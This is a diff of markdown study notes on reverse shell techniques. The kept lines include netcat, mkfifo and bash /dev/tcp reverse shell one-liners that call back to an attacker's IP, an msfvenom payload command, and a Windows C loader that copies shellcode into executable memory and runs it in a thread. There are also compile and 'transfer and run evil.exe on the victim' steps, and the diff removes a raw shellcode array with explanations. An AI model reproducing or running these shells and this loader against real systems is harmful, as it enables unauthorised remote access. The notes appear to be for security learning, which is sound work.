@@ -11,7 +11,7 @@ description: Different types of Reverse Shell's method.
 ---
 # 1. Simple netcat Reverse Shell
 ---
-## Run
+### Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : `nc -e /bin/sh {attackers IP} port`
@@ -24,7 +24,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 > In this case,
 
-## Run
+### Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : `mkfifo /tmp/p; nc {attackers IP} <port> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`
@@ -33,7 +33,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 # 3. Bash
 ---
-## Run
+### Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : `bash -c 'sh -i >& /dev/tcp/<Attacker's IP>/<port> 0>&1'`
@@ -42,7 +42,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 # 4. Python
 ---
-## Run
+### Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : 
@@ -162,26 +162,26 @@ unsigned char my_payload[]=
 unsigned int my_payload_len = sizeof(my_payload);                  // 3
 
 int main() {                                                       // 4
-	void *my_payload_mem; // memory buffer for payload
-	BOOL rv;
+	void *my_payload_mem; // memory buffer for payload             // 5
+	BOOL rv;                                                       // 6
 	HANDLE th;
 	DWORD oldprotect = 0;
 	
 	// Allocate a memory buffer for payload
-	my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);                                                   // 7
 	
 	// copy payload to buffer
-	RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
+	RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);     // 8 
 	
 	// make new buffer as executable
-	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
+	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);                                                      // 9
 	
 	if ( rv != 0 ) {
 		// run payload
-		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
-		WaitForSingleObject(th, -1);
+		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);                                                                // 10
+		WaitForSingleObject(th, -1);                               // 11
 	}
-	return 0;
+	return 0;                                                      // 12
 }
 ```
 #### Explanation
@@ -193,361 +193,31 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker's ip> LPORT=4444 -f c
 ```
 ![[images/Pasted image 20250426112907.png]]
 3. Calculate the size of payload created in **Step 2** with the help of [[Headers, DLLs and Functions#`sizeof()`|sizeof()]] function and store its value in a variable, `my_payload_len`.
-4. 
----
-```C
-#include <windows.h>
-```
-
-`windows.h` is a **Windows-specific header file** that lets your program use the **Windows API** — which is a massive collection of functions Microsoft provides for doing stuff on Windows.
-
----
-```C
-#include <stdio.h>
-```
-
-`<stdio.h>` stands for **Standard Input Output Header** in C and C++.
-
-It provides functions for **basic input and output**, like:
-
-|Function|What It Does|
-|---|---|
-|`printf`|Print to console|
-|`scanf`|Read from user input|
-|`fopen`|Open a file|
-|`fread`|Read data from a file|
-|`fwrite`|Write data to a file|
-|`fclose`|Close a file|
-
----
-```C
-#include <stdlib.h>
-```
-
-`<stdlib.h>` stands for **Standard Library** header in C/C++. It gives you access to **general-purpose utility functions** — especially for:
-
-|Category|Example Functions|Purpose|
-|---|---|---|
-|Memory|`malloc`, `free`, `realloc`|Dynamic memory allocation|
-|Process control|`exit`, `system`, `abort`|Terminate program or run commands|
-|Conversions|`atoi`, `atof`, `strtol`|Convert strings to numbers|
-|Random|`rand`, `srand`|Generate random numbers|
-
----
-```c
-#include <string.h>
-```
-
-This is the **standard C header** for working with **strings and memory**.
-
-It provides functions like:
-
-| Function | What it does                       |
-| -------- | ---------------------------------- |
-| `strlen` | Gets the length of a string        |
-| `strcpy` | Copies one string to another       |
-| `strcat` | Appends one string to another      |
-| `strcmp` | Compares two strings               |
-| `memcpy` | Copies blocks of memory            |
-| `memset` | Fills memory with a constant value |
-`<string.h>` is your **string toolbox** in C. Since C strings are just arrays of characters (not full objects like in C++), this header gives you the functions to manipulate them.
-
----
-```C
-uunsigned char my_payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
-"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
-"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x6c"
-"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
-"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
-"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
-"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
-"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
-"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
-"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
-"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
-"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
-"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
-"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
-"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
-"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
-"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
-"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
-```
-
-You're creating a **byte array** (`my_payload`) filled with **machine instructions** (**our payload**).
-- `unsigned char` is used because each element is a **byte** (0–255).
-- `\xfc`, `\x48`, etc., are **hex values** representing **CPU instructions**.
-- The whole string is **compiled into raw machine code**.
-- This code is meant to be **executed directly** in memory.
----
-```C
-unsigned int my_payload_len = sizeof(mypayload);
-```
-It calculates **the total size** (in bytes) of your `my_payload` array and stores that number into `my_payload_len`.
-- This line **gets the size** of the `my_payload` array.
-- It **saves** that size in `my_payload_len`.
-- Later, the program **uses** `my_payload_len` when allocating memory, copying the payload, and setting memory protections.
----
-```c
-int main(void) {
-```
-
-- Standard starting point for a C or C++ program.
-- `void` inside `main(void)` means it **takes no arguments**.
-- `int` means it **returns an integer** (usually `0` if successful).
----
-```c
-void * my_payload_mem;
-```
-
-- `my_payload_mem` is a **pointer**.
-- It points to a **block of memory** (but we don't know the type yet, that's why it's `void *` — a _generic pointer_).
-- Later, this will point to **memory that stores your payload**.
-
-✅ So: _"Reserve a variable that will hold the location where we put our payload."_
-
----
-```c
-BOOL rv;
-```
-
-- `BOOL` is a **Windows type** from `windows.h`.
-- It’s just a fancy way of saying `int` that can be `TRUE` (1) or `FALSE` (0).
-- Here, `rv` will be used to **check if Windows functions (like VirtualProtect)** succeeded or failed.
-
-✅ So: _"Had Created a variable to store success/failure results."_
-
----
-```c
-HANDLE th;
-```
-
-- `HANDLE` is another Windows type.
-- A **handle** is like a **special ID** Windows gives you to refer to things (files, threads, memory, etc.).
-- `th` will store the **handle to the new thread** created later to run the payload.
-
-✅ So: _"Reserve a variable to remember the thread we will create."_
-
----
-```c
-DWORD oldprotect = 0;
-```
-
-- `DWORD` = "Double Word" (32-bit unsigned integer) — another Windows type.
-- `oldprotect` will store **the old memory protection flags** when we change memory permissions using `VirtualProtect`.
-- (We have to save it because after making memory executable, we might want to restore it.)
-
-✅ So: _"Create a variable to store the previous memory permissions."_
-
----
-```c
-my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-```
-
-> **What is `VirtualAlloc`?**
-
-It's a **Windows API** function that:
-- **Reserves** or **commits** memory.
-- Lets you define **how big**, **where**, and **what permissions** the memory should have.
-- It returns a **pointer** to the memory block.
-
-**Signature of `VirtualAlloc`**
-```c
-LPVOID VirtualAlloc(
-  LPVOID lpAddress,
-  SIZE_T dwSize,
-  DWORD  flAllocationType,
-  DWORD  flProtect
-);
-```
-
-| Parameter          | Description                                                          |
-| ------------------ | -------------------------------------------------------------------- |
-| `lpAddress`        | Desired starting address (usually `NULL` to let system choose).      |
-| `dwSize`           | Number of bytes to allocate.                                         |
-| `flAllocationType` | Type of allocation - this is where `MEM_COMMIT`, `MEM_RESERVE` go.   |
-| `flProtect`        | Memory protection - like `PAGE_READWRITE`, `PAGE_EXECUTE_READ`, etc. |
-
-Returns:
-- A pointer to the allocated memory (`LPVOID`)
-- Or `NULL` if it fails.
-
-**📦 What’s happening in this line?**
-
-| Parameter                  | Meaning                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
-| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `0`                        | Let the OS pick the memory address (we’re not specifying a location).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
-| `my_payload_len`           | Size of the memory block (same size as our shellcode).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
-| `MEM_COMMIT \| MEMRESERVE` | These are **memory allocation flags** used with the Windows API function `VirtualAlloc`.<br><br>`MEM_RESERVE` (`0x2000`)<br>➡ Reserves a **range of the virtual address space**.<br>➡ **No physical memory** is allocated yet.<br>➡ You’re basically saying: “Save this memory space for me, I’ll use it soon.”<br><br>`MEM_COMMIT` (`0x1000`)<br>➡ Actually allocates **physical memory (RAM or page file)**.<br>➡ You can now **read/write** to it.<br>    <br>`MEM_COMMIT \| MEM_RESERVE`<br>➡ Used together to **both reserve and commit** memory in a single step.<br>➡ Very common when you want memory that's ready to use right away. |
-| `PAGE_READWRITE`           | Give it **read and write** access, so we can **copy the payload** into it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
-
-Now  we have a **memory buffer** that is:
-- Reserved ✔️
-- Writable ✔️
-- Big enough for the payload ✔️
-
-And `my_payload_mem` now **points to it**.
-
----
-```c
-RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
-```
-- `RtlMoveMemory` **copies memory** from a **source** to a **destination**.
-- It's the Windows API version of `memcpy()` from C standard library.
-
-**Function signature**:
-
-```c
-VOID RtlMoveMemory(
-  VOID UNALIGNED *Destination,
-  const VOID UNALIGNED *Source,
-  SIZE_T Length
-);
-```
-
-| Parameter     | Meaning                                       |
-| :------------ | :-------------------------------------------- |
-| `Destination` | Where you want to copy to (`my_payload_mem`). |
-| `Source`      | What you want to copy (`my_payload`).         |
-| `Length`      | How many bytes to copy (`my_payload_len`).    |
-
-- You **allocated memory** (`my_payload_mem`) with `VirtualAlloc`.  
-- You **copied** the **payload bytes** (`my_payload`) **into** that allocated memory using `RtlMoveMemory`.
-
-```
-┌─────────────┐           ┌────────────────┐
-│ my_payload  │ --COPY--> │ my_payload_mem │
-│  [SHELLCODE]│           │  [SHELLCODE]   │
-└─────────────┘           └────────────────┘
-```
-So now, our payload is **sitting inside writable memory** in your process.
-
----
-```c
-rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
-```
-- **VirtualProtect** → Changes the **memory protection** of a region of memory. 
-- **Parameters**:
-    - `my_payload_mem` → Start of the memory region (where you copied the payload).
-    - `my_payload_len` → Size (how many bytes) of the memory you want to protect.
-    - `PAGE_EXECUTE_READ` → New memory permissions → now **READ + EXECUTE** (no more writing!).
-    - `&oldprotect` → A pointer to a variable where the **previous** protection (like PAGE_READWRITE) is saved.
-- **rv** → Return value: if `rv != 0`, the call succeeded.
-
-Initially, when we `VirtualAlloc` memory, it was **PAGE_READWRITE** ( can read and write).  
-**But you cannot execute code** from that memory while it's just read-write.
-
-| Time                   | Memory Protection | Can Read? | Can Write? | Can Execute? |
-| :--------------------- | :---------------- | :-------- | :--------- | :----------- |
-| After `VirtualAlloc`   | PAGE_READWRITE    | ✅         | ✅          | ❌            |
-| After `VirtualProtect` | PAGE_EXECUTE_READ | ✅         | ❌          | ✅            |
-
----
-```c
-if (rv != 0){
-	th = CreateThread(0,0,(LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
-	WaitForSingleObject(th, -1);
-}
-```
-
-- `if (rv != 0)`  
-    → Check if `VirtualProtect` succeeded.  
-    → If yes, proceed to run the payload.
-
-**`CreateThread` line:**
-
-```c
-th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
-```
-
-**Meaning:**
-
-- `CreateThread` starts a **new thread** inside your process.
-- It runs the function **located at `my_payload_mem`** — which is your **shellcode**.
-
-> `CreateThread` function **signature**:
-
-```c
-HANDLE CreateThread(
-  LPSECURITY_ATTRIBUTES   lpThreadAttributes, // security settings (usually NULL)
-  SIZE_T                   dwStackSize,        // size of thread stack (usually 0 = default)
-  LPTHREAD_START_ROUTINE   lpStartAddress,     // pointer to function to execute
-  LPVOID                   lpParameter,        // parameter to pass to the function (can be NULL)
-  DWORD                    dwCreationFlags,    // creation options (0 = run immediately)
-  LPDWORD                  lpThreadId          // pointer to thread ID (can be NULL)
-);
-```
-
-| Argument             | What we passed                           | Meaning                          |
-| :------------------- | :--------------------------------------- | :------------------------------- |
-| `lpThreadAttributes` | `0`                                      | Default security                 |
-| `dwStackSize`        | `0`                                      | Default stack size               |
-| `lpStartAddress`     | `(LPTHREAD_START_ROUTINE)my_payload_mem` | Pointer to your shellcode memory |
-| `lpParameter`        | `0`                                      | No parameters                    |
-| `dwCreationFlags`    | `0`                                      | Start immediately                |
-| `lpThreadId`         | `0`                                      | No need to save Thread ID        |
-> What is `LPTHREAD_START_ROUTINE`?
-
-It’s a **Windows-defined function pointer type**. You can find it in `Windows.h`, and it looks like this:
-
-**Analogy:**
-Let’s say `int (*f)(int)` is a function pointer. If we write:
-```c
-(int (*))somePointer  // Cast: "Treat this pointer like a function"
-somePointer(int)      // Call: "Call this pointer like a function"
-```
-
->In short:
-
-`(LPTHREAD_START_ROUTINE)my_payload_mem` is **telling Windows to execute your payload** as a function inside a thread.
-
-
-```c
-WaitForSingleObject(th, -1);
-```
-
-**Meaning:**
-- **Wait for the thread to finish.**
-- `-1` (or `INFINITE`) → wait **forever** (no timeout).
-- So the main process **pauses and waits** while the shellcode runs.
-
-|Part|What happens|
-|:--|:--|
-|`CreateThread`|Creates a new thread that **runs your shellcode**|
-|`WaitForSingleObject`|Main program **waits for shellcode to finish**|
-
----
-
-## Let's Compile
+4. Create a [[Headers, DLLs and Functions#`main()`|main()]] function.
+5. Declare a pointer named `my_payload_mem` of type `void *` which is a generic pointer that can point to any data type.
+6. Declare a variable `rv` of `BOOL` type , `th` of `HANDLE` type and `oldprotect`which is 0 of `DWORD`.
+7. Allocate a memory buffer for payload size to current process using [[Headers, DLLs and Functions#`VirtualAlloc`|VirtualAlloc]].
+8. Using [[Headers, DLLs and Functions#`RtlMoveMemory`|RtlMoveMemory()]] function copy payload to the memory buffer created in **Step 7.**
+9. Change the protection of memory region create in **Step 7** to read and executable using [[Headers, DLLs and Functions#`VirtualProtect`|VirtualProtect()]] function.
+10. If **Step 9** runs perfectly without error, creates a new thread using [[Headers, DLLs and Functions#`CreateThread`|CreateThread()]] function that starts executing the our [[Linux shellcoding#Shellcode|shellcode]] pointed to by `my_payload_mem`, by typecasting it to `LPTHREAD_START_ROUTINE` to tell the system to treat that memory as a function.
+11. Using [[Headers, DLLs and Functions#`WaitForSingleObject`|WaitForSingleObject()]] function pause the main thread until new thread created in **Step 10** is created.
+12. Return 0 is all our above code run successfully without error.
+### Compile and Run
+> **Compile**
 
 **On Attackers' Machine:** `x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
 ![[images/Pasted image 20250426162740.png]]
 
-## Run command
-### Start listener on Attacker's Machine
+>**Run** 
 
+**Start listener on Attacker's Machine:**
 ```shell
 nc -lvnp 4444
 ```
 
 ![[images/Pasted image 20250426163013.png]]
 
-### Transfer and Run evil.exe to victim Machine(Windows 7)
+- **Transfer and Run evil.exe to victim Machine(Windows 7)**
 ```shell
 ./evil.exe
 ```
